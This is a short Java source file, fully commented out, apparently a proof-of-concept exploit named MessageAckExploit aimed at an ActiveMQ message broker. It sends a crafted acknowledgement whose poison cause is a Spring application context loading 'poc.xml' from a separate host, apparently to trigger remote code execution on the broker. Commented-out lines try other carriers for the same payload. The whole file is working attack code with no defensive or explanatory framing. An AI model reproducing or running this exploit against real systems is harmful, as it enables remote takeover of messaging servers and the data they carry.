//package com.example;
//
//import org.apache.activemq.command.ConnectionError;
//import org.apache.activemq.command.ExceptionResponse;
//import  org.springframework.context.support.ClassPathXmlApplicationContext;
//
//
//import javax.jms.*;
//
//import org.apache.activemq.*;
//import org.apache.activemq.command.ActiveMQMessage;
//import org.apache.activemq.command.MessageAck;
//
//
//public class MessageAckExploit {
//
//    public static void main(String[] args) throws Exception {
//
//        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
//
//        Connection connection = factory.createConnection();
//        connection.start();
//
//
//        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
//
//        // Destination destination = session.createQueue("test");
//
//        //MessageConsumer consumer = session.createConsumer(destination);
//
//        // Message message = consumer.receive();
//
//        TextMessage message = session.createTextMessage("1111");
//
//
//        MessageAck ack = new MessageAck((ActiveMQMessage)message, MessageAck.STANDARD_ACK_TYPE, 1);
//
//
//        Exception obj2 = new ClassPathXmlApplicationContext("http://172.20.10.4:8000/poc.xml");
//
//
//        // ExceptionResponse response = new ExceptionResponse(obj2);
//        //response.setException(obj2);
//
//        //ConnectionError  error =  new ConnectionError();
//
//        // error.setException(obj2);
//        ack.setPoisonCause(obj2);
//
//        //    ((ActiveMQConnection)connection).getTransportChannel().oneway(response);
//        //((ActiveMQConnection)connection).getTransportChannel().oneway(factory);
//
//        ((ActiveMQConnection)connection).getTransportChannel().oneway(ack);
//
//
//        //session.close();
//        connection.close();
//
//
//    }
//
//}